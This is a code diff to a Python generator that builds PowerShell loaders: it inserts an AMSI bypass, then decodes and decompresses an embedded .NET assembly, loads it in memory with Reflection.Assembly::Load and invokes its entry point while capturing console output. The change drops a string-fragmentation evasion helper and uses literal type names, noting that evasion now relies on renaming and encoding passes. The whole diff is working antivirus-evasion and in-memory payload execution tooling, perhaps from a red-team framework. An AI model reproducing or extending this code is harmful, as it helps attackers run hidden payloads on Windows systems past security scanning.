@@ -22,17 +22,6 @@ def _rand_var() -> str:
     return "_" + secrets.token_hex(4)
 
 
-def _split_string(s: str) -> str:
-    """Split a string into concatenated fragments for evasion."""
-    parts: list[str] = []
-    i = 0
-    while i < len(s):
-        chunk_len = secrets.randbelow(4) + 2
-        parts.append(s[i : i + chunk_len])
-        i += chunk_len
-    return "(" + "+".join(f"'{p}'" for p in parts) + ")"
-
-
 _AMSI_GENERATORS = {
     "reflection": _gen_reflection_bypass,
     "patch": _gen_patch_bypass,
@@ -65,19 +54,18 @@ def _generate_loader(assembly: bytes, amsi_technique: str = "patch") -> str:
     gen = _AMSI_GENERATORS.get(amsi_technique, _gen_patch_bypass)
     amsi_block = gen()
 
-    # Split sensitive type names
-    deflate_type = _split_string("System.IO.Compression.DeflateStream")
-    ms_type = _split_string("System.IO.MemoryStream")
-
+    # Type names must NOT be fragmented — PS1 [type] casts and New-Object
+    # require literal type names, not string concatenation expressions.
+    # Evasion for these comes from the rename + encode passes instead.
     lines = [
         amsi_block,
         "",
         f"${v_b64} = '{encoded}'",
         f"${v_compressed} = [Convert]::FromBase64String(${v_b64})",
-        f"${v_ms} = New-Object {ms_type}(,${v_compressed})",
-        f"${v_ds} = New-Object {deflate_type}(${v_ms}, "
-        f"[{_split_string('System.IO.Compression.CompressionMode')}]::Decompress)",
-        f"${v_out} = New-Object {ms_type}",
+        f"${v_ms} = New-Object System.IO.MemoryStream(,${v_compressed})",
+        f"${v_ds} = New-Object System.IO.Compression.DeflateStream("
+        f"${v_ms}, [System.IO.Compression.CompressionMode]::Decompress)",
+        f"${v_out} = New-Object System.IO.MemoryStream",
         f"${v_buf} = New-Object byte[] 4096",
         "do {",
         f"    ${v_read} = ${v_ds}.Read(${v_buf}, 0, ${v_buf}.Length)",
@@ -88,22 +76,19 @@ def _generate_loader(assembly: bytes, amsi_technique: str = "patch") -> str:
         f"${v_ms}.Close()",
         f"${v_out}.Close()",
         "",
-        f"${v_asm} = [{_split_string('Reflection.Assembly')}]::Load(${v_bytes})",
+        f"${v_asm} = [Reflection.Assembly]::Load(${v_bytes})",
         f"${v_ep} = ${v_asm}.EntryPoint",
         "",
-        "# Redirect STDOUT to capture output",
-        f"${v_sw} = New-Object {_split_string('System.IO.StringWriter')}",
+        f"${v_sw} = New-Object System.IO.StringWriter",
         f"${v_orig} = [Console]::Out",
         f"[Console]::SetOut(${v_sw})",
         "",
-        "# Invoke EntryPoint",
         f"if (${v_ep}.GetParameters().Count -gt 0) {{",
         f"    ${v_ep}.Invoke($null, @(,(New-Object string[] 0)))",
         "} else {",
         f"    ${v_ep}.Invoke($null, $null)",
         "}",
         "",
-        "# Restore and output",
         f"[Console]::SetOut(${v_orig})",
         f"${v_result} = ${v_sw}.ToString()",
         f"if (${v_result}) {{ Write-Output ${v_result} }}",
